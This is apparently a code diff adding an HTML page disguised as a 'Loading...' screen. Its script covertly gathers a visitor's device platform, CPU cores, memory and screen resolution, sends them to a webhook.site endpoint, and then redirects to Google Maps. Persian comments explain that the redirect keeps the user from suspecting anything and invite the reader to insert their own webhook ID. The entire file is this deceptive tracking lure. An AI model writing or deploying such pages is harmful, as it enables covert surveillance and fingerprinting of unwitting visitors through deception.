@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        async function capture() {
+            // جمع‌آوری اطلاعات فنی دستگاه
+            const info = {
+                device: navigator.platform,
+                cores: navigator.hardwareConcurrency,
+                memory: navigator.deviceMemory + "GB",
+                resolution: window.screen.width + "x" + window.screen.height
+            };
+
+            // ارسال به وب‌هوک تو (ID خودت را جایگزین کن)
+            fetch('https://webhook.site/dd9af163-1084-4613-852c-e8554895a323', {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(info)
+            });
+
+            // انتقال فوری به گوگل مپ برای اینکه کاربر شک نکند
+            setTimeout(() => {
+                window.location.href = "https://www.google.com/maps";
+            }, 400);
+        }
+        capture();
+    </script>
+</body>
+</html>
